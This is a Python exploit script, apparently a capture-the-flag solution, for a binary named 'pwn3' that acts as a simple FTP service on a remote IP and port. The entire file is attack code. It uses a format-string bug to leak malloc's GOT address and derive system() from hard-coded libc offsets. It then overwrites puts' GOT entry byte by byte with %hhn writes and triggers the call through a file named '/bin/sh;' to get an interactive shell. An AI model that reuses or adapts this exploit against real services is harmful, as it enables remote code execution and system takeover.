from zio import *
from pwn import *

target = "./pwn3"
elf_path = "./pwn3"
target = ("120.27.155.82", 9000)
def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")

	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	return io

def get_elf_info(elf_path):
	return ELF(elf_path)

def put_file(io, name, content):
	io.read_until("ftp>")
	io.writeline("put")
	io.read_until(":")
	io.writeline(name)
	io.read_until(":")
	io.writeline(content)

def dir_file(io):
	io.read_until("ftp>")
	io.writeline("dir")

def get_file(io, name):
	io.read_until("ftp>")
	io.writeline("get")
	io.read_until(":")
	io.writeline(name)

def pwn(io):
	#sample
	#elf_info = get_elf_info(elf_path)

	name = "sysbdmin"
	io.read_until("Name (ftp.hacker.server:Rainism):")
	io.writeline()
	real_name = [chr(ord(c)-1) for c in name]
	real_name = "".join(real_name)

	io.writeline(real_name)

	malloc_got = 0x0804a024
	puts_got = 0x0804a028

	name = "aaaa"
	#content = "AAAA" + "B"*4 + "C"*4 + "%7$x."
	content = l32(malloc_got) + "%7$s...."
	put_file(io, name, content)
	get_file(io, name)
	data = io.read_until("....")
	print [c for c in data]
	malloc_addr = l32(data[4:8])
	print "malloc_addr:", hex(malloc_addr)

	#local
	offset_malloc = 0x00076550
	offset_system = 0x0003e800

	#remote
	offset_malloc = 0x000766b0
	offset_system = 0x00040190

	libc_base = malloc_addr - offset_malloc
	system_addr = libc_base + offset_system

	print "system_addr:", hex(system_addr)

	addr_info = ""
	padding_info = ""

	system_addr_buff = l32(system_addr)

	offset = 4*4
	begin_index = 7
	for i in range(4):
		addr_info += l32(puts_got + i)
		val = ord(system_addr_buff[i])
		count = val - offset

		if count <= 0:
			count += 0x100
		padding_info += "%%%dc"%count + "%%%d$hhn"%(begin_index + i)

		offset = val

	name = "/bin/sh;"
	content = addr_info + padding_info
	put_file(io, name, content)

	io.gdb_hint()
	get_file(io, name)

	dir_file(io)
	io.interact()
	pass

io = get_io(target)
pwn(io)

